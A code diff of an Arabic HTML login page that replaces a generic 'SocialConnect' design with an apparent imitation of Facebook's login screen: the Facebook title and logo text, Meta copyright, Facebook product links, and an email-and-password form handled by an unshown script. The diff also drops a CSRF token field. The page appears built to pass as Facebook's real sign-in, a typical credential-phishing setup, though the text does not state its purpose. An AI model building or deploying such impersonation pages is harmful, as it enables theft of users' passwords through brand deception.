@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - SocialConnect</title>
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -12,140 +12,148 @@
 </head>
 <body>
     <div class="container">
-        <div class="content-wrapper">
-            <div class="left-section">
-                <div class="brand-section">
-                    <div class="logo-large">
-                        <i class="fas fa-users"></i>
-                        <h1>SocialConnect</h1>
-                    </div>
-                    <p class="tagline">
-                        يتيح SocialConnect لك التواصل مع الأشخاص ومشاركة حياتك.
-                    </p>
-                </div>
-                <div class="features">
-                    <div class="feature">
-                        <i class="fas fa-user-friends"></i>
-                        <span>تواصل مع الأصدقاء والعائلة</span>
-                    </div>
-                    <div class="feature">
-                        <i class="fas fa-photo-video"></i>
-                        <span>شارك الصور ومقاطع الفيديو</span>
-                    </div>
-                    <div class="feature">
-                        <i class="fas fa-comments"></i>
-                        <span>تواصل فوري عبر المراسلة</span>
-                    </div>
-                    <div class="feature">
-                        <i class="fas fa-bell"></i>
-                        <span>ابق على اطلاع بآخر التحديثات</span>
+        <!-- شريط التنقل العلوي -->
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="logo-section">
+                    <div class="logo">
+                        <span class="fb-logo">facebook</span>
                     </div>
                 </div>
             </div>
+        </nav>
 
-            <div class="right-section">
-                <div class="login-box">
-                    <form id="loginForm" class="login-form">
-                        <input type="hidden" id="csrfToken" name="csrfToken" value="csrf_token_placeholder">
-                        
-                        <div class="form-group">
-                            <input 
-                                type="text" 
-                                id="email" 
-                                name="email"
-                                required
-                                placeholder="البريد الإلكتروني أو رقم الهاتف"
-                                autocomplete="username"
-                                class="fb-input"
-                            >
-                        </div>
-                        
-                        <div class="form-group">
-                            <div class="password-wrapper">
+        <!-- المحتوى الرئيسي -->
+        <main class="main-content">
+            <div class="content-container">
+                <!-- القسم الأيسر -->
+                <div class="left-section">
+                    <h1 class="welcome-text">تسجيل الدخول إلى فيسبوك</h1>
+                    <div class="login-box">
+                        <form id="loginForm" class="login-form">
+                            <div class="form-group">
+                                <input 
+                                    type="text" 
+                                    id="email" 
+                                    name="email"
+                                    required
+                                    placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
+                                    class="form-input"
+                                >
+                            </div>
+                            
+                            <div class="form-group">
                                 <input 
                                     type="password" 
                                     id="password" 
                                     name="password"
                                     required
-                                    placeholder="كلمة المرور"
-                                    autocomplete="current-password"
-                                    class="fb-input"
+                                    placeholder="كلمة السر"
+                                    class="form-input"
                                 >
-                                <button type="button" class="toggle-password" id="togglePassword">
-                                    <i class="fas fa-eye"></i>
-                                </button>
                             </div>
-                        </div>
-                        
-                        <button type="submit" class="fb-login-btn" id="loginBtn">
-                            تسجيل الدخول
-                        </button>
-                        
-                        <div class="forgot-password-link">
-                            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
-                        </div>
-                        
-                        <div class="separator"></div>
-                        
-                        <button type="button" class="fb-create-account-btn">
-                            إنشاء حساب جديد
-                        </button>
-                    </form>
+                            
+                            <button type="submit" class="login-btn" id="loginBtn">
+                                تسجيل الدخول
+                            </button>
+                            
+                            <div class="forgot-password">
+                                <a href="#">هل نسيت كلمة السر؟</a>
+                            </div>
+                            
+                            <div class="divider"></div>
+                            
+                            <button type="button" class="create-account-btn">
+                                إنشاء حساب جديد
+                            </button>
+                        </form>
+                    </div>
                     
-                    <div class="official-page-link">
-                        <a href="#" class="page-link">
-                            <i class="fas fa-star"></i>
-                            <span>إنشاء صفحة</span> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
-                        </a>
+                    <!-- قسم التطبيق -->
+                    <div class="app-section">
+                        <p class="app-text">احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.</p>
+                        <button class="get-app-btn">
+                            <i class="fab fa-android"></i>
+                            <span>الحصول على التطبيق</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- القسم الأيمن -->
+                <div class="right-section">
+                    <div class="info-card">
+                        <h3>المزيد من المعلومات</h3>
+                        <ul class="info-links">
+                            <li><a href="#">إضافة صفحة</a></li>
+                            <li><a href="#">حول</a></li>
+                            <li><a href="#">إنشاء إعلان</a></li>
+                            <li><a href="#">إنشاء صفحة</a></li>
+                            <li><a href="#">المطورون</a></li>
+                            <li><a href="#">الوظائف</a></li>
+                            <li><a href="#">الخصوصية</a></li>
+                            <li><a href="#">ملفات تعريف الارتباط</a></li>
+                            <li><a href="#">اختيارات الإعلانات</a></li>
+                            <li><a href="#">الشروط</a></li>
+                            <li><a href="#">مساعدة</a></li>
+                        </ul>
                     </div>
                 </div>
             </div>
-        </div>
+        </main>
 
+        <!-- الفوتر -->
         <footer class="footer">
             <div class="footer-content">
+                <!-- اللغة -->
+                <div class="language-selector">
+                    <select class="lang-select">
+                        <option value="ar">العربية</option>
+                        <option value="en">English (US)</option>
+                        <option value="fr">Français (France)</option>
+                        <option value="es">Español</option>
+                    </select>
+                </div>
+                
+                <!-- الروابط -->
                 <div class="footer-links">
-                    <div class="language-selector">
-                        <span>العربية</span>
-                        <i class="fas fa-chevron-down"></i>
-                    </div>
-                    
-                    <div class="links-row">
-                        <a href="#">التسجيل</a>
-                        <a href="#">تسجيل الدخول</a>
-                        <a href="#">Messenger</a>
-                        <a href="#">SocialConnect Lite</a>
-                        <a href="#">الفيديو</a>
-                        <a href="#">الأماكن</a>
-                        <a href="#">الألعاب</a>
-                        <a href="#">Marketplace</a>
-                        <a href="#">Meta Pay</a>
-                        <a href="#">Portal</a>
-                        <a href="#">Instagram</a>
-                        <a href="#">Bulletin</a>
-                        <a href="#">التبرعات</a>
-                        <a href="#">الخدمات</a>
-                        <a href="#">مركز معلومات الناخبين</a>
-                        <a href="#">سياسة الخصوصية</a>
-                        <a href="#">مركز الخصوصية</a>
-                        <a href="#">المجموعات</a>
-                        <a href="#">الوظائف</a>
-                        <a href="#">ملفات تعريف الارتباط</a>
-                        <a href="#">خيارات الإعلانات</a>
-                        <a href="#">الشروط</a>
-                        <a href="#">مساعدة</a>
-                        <a href="#">تحميل جهات الاتصال وغير الأعضاء</a>
-                    </div>
-                    
-                    <div class="meta-info">
-                        <span>SocialConnect © 2023</span>
-                    </div>
+                    <a href="#">التسجيل</a>
+                    <a href="#">تسجيل الدخول</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">الفيديو</a>
+                    <a href="#">الأماكن</a>
+                    <a href="#">الألعاب</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Oculus</a>
+                    <a href="#">Portal</a>
+                    <a href="#">Instagram</a>
+                    <a href="#">Bulletin</a>
+                    <a href="#">التبرعات</a>
+                    <a href="#">الخدمات</a>
+                    <a href="#">مركز معلومات الناخبين</a>
+                    <a href="#">سياسة الخصوصية</a>
+                    <a href="#">مركز الخصوصية</a>
+                    <a href="#">المجموعات</a>
+                    <a href="#">الوظائف</a>
+                    <a href="#">ملفات تعريف الارتباط</a>
+                    <a href="#">اختيارات الإعلانات</a>
+                    <a href="#">الشروط</a>
+                    <a href="#">مساعدة</a>
+                    <a href="#">تحميل جهات الاتصال وغير الأعضاء</a>
+                    <a href="#">الإعدادات</a>
+                </div>
+                
+                <!-- حقوق النشر -->
+                <div class="copyright">
+                    Meta © 2023
                 </div>
             </div>
         </footer>
     </div>
 
-    <div id="alertContainer"></div>
+    <!-- رسائل التنبيه -->
+    <div id="messageContainer"></div>
 
     <script src="script.js"></script>
 </body>
